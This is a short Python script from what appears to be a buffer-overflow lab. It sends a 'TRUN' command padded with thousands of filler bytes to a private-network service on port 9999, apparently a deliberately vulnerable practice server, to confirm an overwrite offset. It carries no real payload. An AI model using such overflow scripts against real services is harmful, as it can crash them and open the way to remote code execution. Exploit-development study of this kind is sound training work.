
#!/usr/bin/python

import sys
import socket 

shellcode = b"A"*2003 + b"B"*4 + b"C"*(1400-515-4)
try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.0.126',9999))	#
	s.send((b'TRUN /.:/' + shellcode)) 
	s.close()

except:
	print ('error connecting to server')
	sys.exit()

